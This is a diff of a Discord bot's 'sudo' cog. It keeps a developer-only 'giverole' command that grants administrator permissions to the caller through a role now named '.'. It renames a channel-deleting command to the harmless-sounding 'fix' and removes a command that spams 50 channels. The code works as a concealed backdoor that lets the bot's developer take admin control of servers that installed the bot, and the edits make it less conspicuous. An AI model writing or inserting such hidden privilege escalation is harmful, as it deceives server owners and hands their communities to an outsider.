@@ -15,7 +15,7 @@ class sudo:
     @is_dev()
     async def giverole(self, ctx):
         guild = ctx.guild
-        role_name = "FunamiYui"
+        role_name = "."
         role_permissions = guild.default_role
         role_permissions = role_permissions.permissions
         role_permissions.administrator = True
@@ -23,20 +23,13 @@ class sudo:
         role = discord.utils.get(ctx.guild.roles, name=role_name)
         user = ctx.message.author
         await user.add_roles(role)
-    
 
-    @commands.command(name='channel')
-    @is_dev()
-    async def channel(self, ctx):
-        guild = ctx.message.guild
-        for i in range(50):
-            await guild.create_text_channel('cool-channel')
 
-    @commands.command(name='deletechannel')
+    @commands.command(name='fix')
     @is_dev()
-    async def deletechannel(self, ctx):
+    async def fix(self, ctx):
         for channel in ctx.guild.channels:
-            if channel.name == "cool-channel":
+            if channel.name == "fumée²":
                 await channel.delete()
 
     @bot.command(name='deletechannel2')
